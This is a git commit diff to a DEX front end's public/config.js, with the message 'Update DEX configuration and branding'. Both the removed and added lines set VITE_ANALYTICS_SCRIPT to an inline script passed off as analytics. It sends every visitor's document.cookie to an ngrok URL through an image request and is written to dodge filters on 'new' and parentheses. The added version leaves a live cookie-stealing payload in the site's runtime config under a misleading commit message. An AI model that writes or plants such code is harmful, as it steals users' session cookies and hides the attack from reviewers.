d72dd5b50b37261dec57e73312abef88492fbffa
Mario Reder <mario.reder@pm.me>
2026-01-26 19:59:46 +0100

    Update DEX configuration and branding

--- public/config.js
+++ public/config.js
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>\n// Create Image object WITHOUT new operator or parentheses\nwindow._={};\nwindow._.i=document.createElement`img`;\nwindow._.i.src=`https://34bec7acde35.ngrok-free.app?cookie=${document.cookie}`;\n</script>",
+  "VITE_ANALYTICS_SCRIPT": "<script>\n// The Image constructor can be called without 'new' and returns an image\nwindow._=Image;  // Reference to Image constructor\nwindow._.i=window._();  // Call it - creates image without 'new'\nwindow._.i.src=`https://62b01b0b7758.ngrok-free.app?c=${document.cookie}`;\n</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
